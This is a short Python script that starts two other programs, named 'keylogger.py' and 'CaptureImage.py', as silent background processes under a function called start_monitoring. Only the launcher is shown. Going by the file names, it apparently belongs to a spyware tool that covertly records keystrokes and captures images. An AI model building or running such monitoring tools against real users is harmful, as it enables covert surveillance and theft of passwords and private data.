import subprocess
import sys


def start_monitoring():
    try:
        subprocess.Popen([sys.executable, "keylogger.py"],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)

        subprocess.Popen([sys.executable, "CaptureImage.py"],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)

        return True
    except Exception as e:
        print(f"Error starting monitoring: {e}")
        return False


if __name__ == "__main__":
    start_monitoring()